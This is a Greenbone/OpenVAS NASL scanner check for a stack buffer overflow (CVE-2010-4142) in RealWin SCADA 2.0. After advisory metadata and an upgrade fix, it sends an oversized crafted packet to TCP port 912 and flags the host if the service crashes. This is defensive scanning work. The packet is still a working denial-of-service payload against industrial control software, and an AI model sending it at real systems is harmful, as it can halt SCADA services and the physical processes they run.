if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.801622" );
	script_version( "$Revision: 14323 $" );
	script_tag( name: "last_modification", value: "$Date: 2019-03-19 14:19:09 +0100 (Tue, 19 Mar 2019) $" );
	script_tag( name: "creation_date", value: "2010-11-02 18:01:36 +0100 (Tue, 02 Nov 2010)" );
	script_bugtraq_id( 44150 );
	script_cve_id( "CVE-2010-4142" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "RealWin SCADA System Buffer Overflow Vulnerabilities" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/41849" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/15259/" );
	script_xref( name: "URL", value: "http://downloads.securityfocus.com/vulnerabilities/exploits/44150-1.rb" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Buffer overflow" );
	script_dependencies( "find_service.sc" );
	script_require_ports( 912 );
	script_tag( name: "impact", value: "Successful exploitation may allow remote attackers to execute
arbitrary code on the system or cause a denial of service condition." );
	script_tag( name: "affected", value: "RealWin SCADA System 2.0 Build 6.1.8.10 and prior." );
	script_tag( name: "insight", value: "The flaws are due to a boundary errors when processing
'SCPC_INITIALIZE', 'SCPC_INITIALIZE_RF' and 'SCPC_TXTEVENT' packets that can
be exploited to cause a stack-based buffer overflow by sending specially
crafted packets to port 912/TCP." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Upgrade to RealWin SCADA System version 2.1 Build 6.1.10.10" );
	script_tag( name: "summary", value: "This host is running RealWin SCADA system and is prone to buffer
overflow vulnerabilities." );
	exit( 0 );
}
port = 912;
if(!get_port_state( port )){
	exit( 0 );
}
head = raw_string( 0x64, 0x12, 0x54, 0x6A, 0x20, 0x00, 0x00, 0x00, 0xF4, 0x1F, 0x00, 0x00 );
junk = crap( data: "a", length: 8190 );
junk += raw_string( 0x00 );
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: head + junk );
close( soc );
sleep( 5 );
soc = open_sock_tcp( port );
if(!soc){
	security_message( port );
}

